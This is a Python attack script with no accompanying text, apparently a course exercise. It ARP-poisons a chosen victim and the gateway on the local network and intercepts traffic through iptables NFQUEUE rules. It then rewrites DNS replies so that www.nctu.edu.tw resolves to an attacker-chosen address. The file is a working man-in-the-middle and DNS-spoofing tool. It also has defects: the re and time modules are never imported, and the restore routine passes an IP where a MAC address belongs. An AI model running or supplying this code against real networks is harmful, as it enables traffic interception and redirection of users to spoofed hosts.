#!/usr/bin/env python3

import scapy.all as scapy
import netifaces
import sys
import os
from netfilterqueue import NetfilterQueue

os.system("sysctl -w net.ipv4.ip_forward=1")
os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

vic = {'ip':'', 'mac':''}
gtw = {'ip':'', 'mac':''}

gateway = netifaces.gateways()['default'][netifaces.AF_INET]
gtw_ip = gateway[0]
iface = gateway[1]

arp = scapy.ARP(pdst=gtw_ip + '/24')
ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

result = scapy.srp(ether/arp, timeout=3, verbose=0)[0]

print("Available devices")
print("-"*41)
print("IP" + " "*20 + "MAC address")
print("-"*41)

for send, recv in result:
    client = {'ip': recv.psrc, 'mac': recv.hwsrc}
    if recv.psrc == gtw_ip:
        gtw = client
    else:
        if not re.match(r'(.*).254$', client['ip'], re.M):
            print("{:22}{}".format(client['ip'], client['mac']))
            vic = client

def spoofer(targetIP, spoofIP):
    packet=scapy.ARP(op=2, pdst=targetIP, hwdst="aa:aa:aa:aa:aa:aa", psrc=spoofIP)
    scapy.send(packet,verbose=False)

def restore(src, dst):
    packet=scapy.ARP(op=2, pdst=dst['ip'], hwdst=dst['mac'], psrc=src['ip'], hwsrc=src['ip'])
    scapy.send(packet,verbose=False)

def dns_spoof(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload())
    if scapy_pkt.haslayer(scapy.DNSRR):
        qname = scapy_pkt[scapy.DNSQR].qname
        if "www.nctu.edu.tw" in str(qname, 'utf-8'):
            print("\n[+] Spoofing target", end="")
            scapy_pkt[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata="140.113.207.246")
            scapy_pkt[scapy.DNS].ancount = 1

            try:
                del scapy_pkt[scapy.IP].len
                del scapy_pkt[scapy.IP].chksum
                del scapy_pkt[scapy.UDP].len
                del scapy_pkt[scapy.UDP].chksum
            except:
                pass
            #print(scapy_pkt.show())

        pkt.set_payload(bytes(scapy_pkt))
    pkt.accept()

pkt_cnt = 0

nfqueue = NetfilterQueue()
nfqueue.bind(0, dns_spoof)

try:
    pid = os.fork()
    if pid == 0:
        nfqueue.run()
    else:
        while True:
            spoofer(vic['ip'], gtw['ip'])
            spoofer(gtw['ip'], vic['ip'])
            pkt_cnt += 2
            print("\r[+] Send packet: " + str(pkt_cnt), end=""),
            time.sleep(2)
except KeyboardInterrupt:
    print("\nSpoofing stop...")
    os.system("iptables --flush")
    nfqueue.unbind()
    restore(vic, gtw)
    restore(gtw, vic)
